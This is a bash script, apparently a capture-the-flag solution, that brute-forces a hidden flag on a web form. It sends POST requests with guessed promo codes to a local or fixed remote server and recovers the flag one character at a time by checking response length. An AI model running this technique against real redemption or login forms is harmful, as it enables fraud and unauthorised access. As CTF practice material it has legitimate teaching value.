#!/bin/bash
PORT=8010

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# One by one
echo "Start exploit for One by one"

str_1=$(printf '%b' $(printf '\\x%x' {65..90}))
str_2=$(printf '%b' $(printf '\\x%x' {97..122}))
str_3=$(printf '%b' $(printf '\\x%x' {48..57}))
str=$str_2$str_1$str_3'{}_'

while [ -n "$str" ]; do
    next=${str#?}
    char="${str%$next}"
    aux=$aux$char
    echo "Check SSS$aux"
    out=$(curl -s -d 'promo=SSS'$aux'&submit=Redeem' -H "Content-Type: application/x-www-form-urlencoded" -X POST $url | wc -c)
    if [ $out -eq 11085 ]
    then
        echo "Match character - $char"
        echo
        str=$str_2$str_1$str_3'{}_'
        continue
    else
        echo "Not match character - $char"
        echo
        aux=${aux%?}
    fi
    str=$next
done

flag='SSS'$aux
echo "Flag is $flag"
echo "----------------------------"
